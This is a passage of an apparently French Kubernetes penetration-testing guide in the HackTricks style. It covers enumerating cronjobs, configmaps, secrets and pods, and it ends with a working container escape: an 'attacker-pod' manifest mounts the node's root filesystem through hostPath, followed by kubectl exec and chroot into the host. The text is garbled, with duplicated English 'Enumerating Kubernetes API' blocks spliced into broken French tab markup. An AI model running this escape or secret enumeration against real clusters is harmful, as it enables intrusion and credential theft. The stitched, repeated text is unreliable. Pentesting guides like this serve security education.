   curl http://NODE_IP:10255/stats/summary
   ```

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Obtenir cronjob

Les t√¢ches cron permettent de planifier en utilisant une syntaxe similaire √† crontab le lancement d'un pod qui effectuera une action.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

Kubectl is the command-line tool used to interact with Kubernetes clusters. By default, it looks for a configuration file at `~/.kube/config`. This file contains information about the cluster, authentication details, and other settings.

To list all available contexts in the kubeconfig file, use the following command:

```bash
kubectl config get-contexts
```

To switch between contexts, use:

```bash
kubectl config use-context <context-name>
```

To list all resources in the cluster, use:

```bash
kubectl api-resources --verbs=list
```

#### API Endpoints

Kubernetes API server exposes various endpoints that can be accessed to gather information about the cluster. Some commonly used endpoints include:

- `/api/v1`: Core API group
- `/apis`: Lists all available API groups
- `/healthz`: Health check endpoint
- `/version`: Displays the Kubernetes version

To access these endpoints, you can use tools like `curl` or `kubectl`:

```bash
curl http://<kube-apiserver-ip>:<port>/api/v1
```

```bash
kubectl get --raw /api/v1
```

#### RBAC

Role-Based Access Control (RBAC) is used to control access to resources in a Kubernetes cluster. To view roles and role bindings in the cluster, you can use the following commands:

```bash
kubectl get roles
kubectl get rolebindings
```

#### Service Accounts

Service accounts are used by pods to authenticate to the Kubernetes API server. To list all service accounts in the cluster, you can use:

```bash
kubectl get serviceaccounts
```

#### Namespaces

Namespaces are virtual clusters within a Kubernetes cluster. To list all namespaces in the cluster, you can use:

```bash
kubectl get namespaces
```

#### Nodes

Nodes are individual machines that run containerized applications. To list all nodes in the cluster, you can use:

```bash
kubectl get nodes
```

#### Pods

Pods are the smallest deployable units in Kubernetes. To list all pods in the cluster, you can use:

```bash
kubectl get pods
```

#### Deployments

Deployments manage the lifecycle of pods in Kubernetes. To list all deployments in the cluster, you can use:

```bash
kubectl get deployments
```

#### Secrets

Secrets store sensitive information like passwords, OAuth tokens, and SSH keys. To list all secrets in the cluster, you can use:

```bash
kubectl get secrets
```

#### ConfigMaps

ConfigMaps store configuration data in key-value pairs. To list all configmaps in the cluster, you can use:

```bash
kubectl get configmaps
```

#### Persistent Volumes

Persistent Volumes (PVs) are storage resources in a cluster. To list all persistent volumes in the cluster, you can use:

```bash
kubectl get pv
```

#### Storage Classes

Storage Classes define different classes of storage in a cluster. To list all storage classes in the cluster, you can use:

```bash
kubectl get storageclasses
```

#### Network Policies

Network Policies define how pods are allowed to communicate with each other. To list all network policies in the cluster, you can use:

```bash
kubectl get networkpolicies
```

#### Pod Security Policies

Pod Security Policies control security-sensitive aspects of pod specification. To list all pod security policies in the cluster, you can use:

```bash
kubectl get psp
```

#### Custom Resource Definitions

Custom Resource Definitions (CRDs) extend the Kubernetes API to support new resource types. To list all CRDs in the cluster, you can use:

```bash
kubectl get crds
```

#### Helm Charts

Helm is a package manager for Kubernetes that allows you to define, install, and upgrade applications. To list all installed Helm charts in the cluster, you can use:

```bash
helm list
```

#### External Services

External services like LoadBalancers and Ingress controllers provide external access to applications running in the cluster. To list all external services in the cluster, you can use:

```bash
kubectl get services
```

#### Summary

Enumerating Kubernetes resources and API endpoints is an essential step in understanding the security posture of a cluster. By gathering information about the cluster's configuration, resources, and access controls, security professionals can identify potential misconfigurations and vulnerabilities that may be exploited by attackers.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Obtenir configMap

configMap contient toujours beaucoup d'informations et de fichiers de configuration fournis aux applications qui s'ex√©cutent dans le kubernetes. Habituellement, vous pouvez trouver de nombreux mots de passe, secrets, jetons utilis√©s pour se connecter et valider d'autres services internes/externes.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

### Enumerating Kubernetes API

#### Kubectl

Kubectl is the command-line tool used to interact with Kubernetes clusters. By default, it looks for a configuration file at `~/.kube/config`. This file contains information about the cluster, user, and authentication method.

To list all available contexts:

```bash
kubectl config get-contexts
```

To switch between contexts:

```bash
kubectl config use-context <context-name>
```

To list all available namespaces:

```bash
kubectl get namespaces
```

To list all resources in a namespace:

```bash
kubectl api-resources --namespaced=true
kubectl api-resources --namespaced=false
```

#### API Server

The Kubernetes API server exposes a wide range of information about the cluster. By default, it listens on port `6443`. You can interact with the API server using tools like `curl` or `kubectl`.

To list all available API resources:

```bash
kubectl api-resources
```

To get detailed information about a specific resource:

```bash
kubectl explain <resource>
```

#### Service Accounts

Service accounts are used by pods to authenticate with the Kubernetes API server. They are mounted as volumes within pods and provide a way to interact securely with the API server.

To list all service accounts in a namespace:

```bash
kubectl get serviceaccounts
```

To get detailed information about a specific service account:

```bash
kubectl get serviceaccount <name> -o yaml
```

#### RBAC

Role-Based Access Control (RBAC) is used to control access to resources in a Kubernetes cluster. By enumerating RBAC roles and role bindings, you can understand the level of access different users have within the cluster.

To list all roles in a namespace:

```bash
kubectl get roles
```

To list all role bindings in a namespace:

```bash
kubectl get rolebindings
```

#### Secrets

Kubernetes secrets are used to store sensitive information such as passwords, OAuth tokens, and SSH keys. Enumerating secrets can reveal valuable information about the configuration of the cluster.

To list all secrets in a namespace:

```bash
kubectl get secrets
```

To get detailed information about a specific secret:

```bash
kubectl get secret <name> -o yaml
```

#### Summary

Enumerating the Kubernetes API, service accounts, RBAC roles, role bindings, and secrets can provide valuable insights into the security posture of a Kubernetes cluster. Understanding the configuration and access controls in place is crucial for securing the cluster against potential attacks.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Obtenir "tout"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Obtenir les consommations des Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### √âchapper du pod

Si vous √™tes capable de cr√©er de nouveaux pods, vous pourriez √™tre en mesure de vous √©chapper pour acc√©der au n≈ìud. Pour ce faire, vous devez cr√©er un nouveau pod en utilisant un fichier yaml, passer au pod cr√©√©, puis chrooter dans le syst√®me du n≈ìud. Vous pouvez utiliser des pods d√©j√† existants comme r√©f√©rence pour le fichier yaml car ils affichent des images et des chemins existants.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Si vous avez besoin de cr√©er un pod sur un n≈ìud sp√©cifique, vous pouvez utiliser la commande suivante pour obtenir les libell√©s sur le n≈ìud
>
> `k get nodes --show-labels`
>
> G√©n√©ralement, kubernetes.io/hostname et node-role.kubernetes.io/master sont tous deux de bons libell√©s √† s√©lectionner.
>
> [r√©f√©rence]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Ensuite, vous cr√©ez votre fichier attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[Source yaml original](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Apr√®s cela, vous cr√©ez le pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Maintenant, vous pouvez passer √† la pod cr√©√©e comme suit
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Et enfin vous chroot dans le syst√®me du n≈ìud
```bash
chroot /root /bin/bash
```
Information obtenue √† partir de : [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attaquer et d√©fendre Kubernetes: Bust-A-Kube ‚Äì √âpisode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## R√©f√©rences

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
